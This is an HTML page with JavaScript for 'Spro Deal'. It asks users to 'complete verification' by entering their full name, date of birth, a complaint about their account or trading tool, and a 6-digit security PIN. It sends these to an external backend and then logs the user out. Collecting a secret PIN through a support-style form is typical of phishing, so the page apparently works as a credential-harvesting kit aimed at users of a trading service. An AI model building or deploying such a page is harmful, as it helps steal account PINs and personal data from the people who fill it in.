<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Verification Page</title>

<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}

  body{
    background:#ffffff;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding:20px;
  }

  .header{
    width:100%;
    max-width:1500px;
    background:linear-gradient(#8fc84a,#75b53b);
    padding:30px;
    border-radius:18px;
    text-align:center;
    color:white;
    margin-bottom:50px;
    position:relative;
    line-height:45px;
  }

  .logout-btn{
    position:absolute;
    right:25px;top:20px;
    background:#ff5722;
    color:white;
    border:none;
    padding:7px 16px;
    border-radius:8px;
    cursor:pointer;
    font-size:14px;
  }

  .form-box{
    width:95%;
    max-width:760px;
    background:#fff;
    padding:35px;
    border-radius:22px;
    box-shadow:0 8px 25px rgba(0,0,0,0.12);
    border:1px solid #e6e6e6;
  }

  .form-box h2{
    text-align:center;margin-bottom:25px;
    font-size:24px;color:#333;font-weight:bold;
  }

  label{display:block;margin-top:18px;font-weight:bold;font-size:15px;color:#222;}

  input,select{
    width:100%;padding:13px;margin-top:7px;
    border:1px solid #ccc;border-radius:10px;font-size:15px;background:#fafafa;
  }

  .password-box{position:relative;}
  .eye-icon{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;}

  button.submit-btn{
    width:100%;margin-top:28px;background:#6bb133;border:none;
    padding:14px;color:white;font-size:17px;border-radius:10px;
    cursor:pointer;font-weight:bold;
  }

  /* ---------- POPUP ------------ */
  #popupOverlay{
    position:fixed;
    top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.5);
    display:none;
    justify-content:center;
    align-items:center;
    z-index:999;
  }

  #popupBox{
    width:90%;
    max-width:400px;
    background:white;
    padding:25px;
    border-radius:15px;
    text-align:center;
    box-shadow:0px 4px 20px rgba(0,0,0,0.2);
  }

  #popupBox img{
    width:70px;margin-bottom:15px;
  }

  #popupBox h2{
    margin-bottom:10px;font-size:22px;color:#222;
  }

  #popupBox p{
    margin-bottom:20px;color:#555;font-size:15px;
  }

  #okBtn{
    background:#6bb133;color:white;border:none;
    padding:10px 26px;cursor:pointer;
    border-radius:8px;font-size:16px;
  }
</style>
</head>

<body>

<div class="header">
  <h1>Welcome to Spro Deal</h1>
  <p>Please complete your verification</p>
  <button class="logout-btn" onclick="window.location.href='index.html'">Logout</button>
</div>

<form class="form-box" id="verificationForm">
  <h2>Verification Details</h2>

  <label>Full Name</label>
  <input type="text" name="full_name" placeholder="Enter your Name" required />

  <label>Date of Birth</label>
  <input type="date" name="dob" required />

  <label>Problem</label>
  <select name="problem" required>
    <option value="">Select your problem</option>
    <option>Id auto Logout</option>
    <option>Slow sell</option>
    <option>Quto not added</option>
    <option>Tool auto deauthorized</option>
  </select>

  <label>Security PIN (6 digits)</label>
  <div class="password-box">
    <input type="password" id="pin" name="security_pin" maxlength="6" placeholder="******" required />
    <span class="eye-icon" id="toggleEye">üëÅÔ∏è</span>
  </div>

  <label>Investment Experience</label>
  <select name="experience" required>
    <option value="">Select experience level</option>
    <option>Beginner (0-1 years)</option>
    <option>Intermediate (1-3 years)</option>
    <option>Experienced (3-5 years)</option>
    <option>Expert (5+ years)</option>
  </select>

  <button type="submit" class="submit-btn">Submit Verification</button>
</form>

<!-- SUCCESS POPUP -->
<div id="popupOverlay">
  <div id="popupBox">
    <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" />
    <h2>Submission Successful</h2>
    <p>Your verification details have been submitted.<br>Your problem is under review.</p>
    <button id="okBtn">OK</button>
  </div>
</div>

<script>
// üî• Set your deployed backend URL
const BASE_URL = "https://sprodeal-backend-5.onrender.com";

// PIN toggle
document.getElementById("toggleEye").addEventListener("click", () => {
    const pin = document.getElementById("pin");
    pin.type = pin.type === "password" ? "text" : "password";
});

// Verification form submit
document.getElementById("verificationForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const user_id = localStorage.getItem("user_id");
    if (!user_id) {
        alert("Please login first");
        window.location.href = "index.html";
        return;
    }

    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());
    data.user_id = user_id;

    // PIN validation
    if (!/^\d{6}$/.test(data.security_pin)) {
        alert("PIN must be 6 digits");
        return;
    }

    try {
        const res = await fetch(`${BASE_URL}/verify`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await res.json();

        if (result.success) {
            showPopup();
        } else {
            alert(result.message || "Submission failed");
        }
    } catch (err) {
        console.error("Verification Error:", err);
        alert("Error connecting to server. Please try again later.");
    }
});

// Popup logic
function showPopup() {
    document.getElementById("popupOverlay").style.display = "flex";

    setTimeout(() => {
        localStorage.removeItem("user_id");
        window.location.href = "index.html";
    }, 10000);
}

document.getElementById("okBtn").onclick = function () {
    localStorage.removeItem("user_id");
    window.location.href = "index.html";
};
</script>



</body>
</html>
